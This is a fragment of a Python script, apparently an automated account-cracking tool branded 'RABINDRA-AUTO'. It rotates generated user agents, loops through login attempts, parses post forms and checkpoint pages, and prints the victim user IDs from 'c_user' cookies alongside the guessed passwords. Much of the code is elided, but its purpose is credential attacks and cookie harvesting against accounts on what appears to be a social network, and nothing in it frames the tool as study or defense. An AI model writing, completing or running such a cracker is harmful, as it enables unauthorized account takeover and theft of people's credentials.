...
for xd in range(5000):
    ...
    ugen.append(uas)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<💚MR.RABINDRA💚>\x07')
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL METHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#        
        ...
        for x in range(lim):
            self.loop += 1
            sys.stdout.write(f'\r\r{A}[{G}RABINDRA-AUTO{A}] >> {A}[{R}{self.loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(ok)}{A}]')
            sys.stdout.flush()
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    ...
                                    cok = self.ses.cookies.get_dict()
                                    print(f'\r\x1b[38;5;46m{A}[{G}RABINDRA-OK💉{A}]{G} '+cok['c_user']+' | '+passw+'')
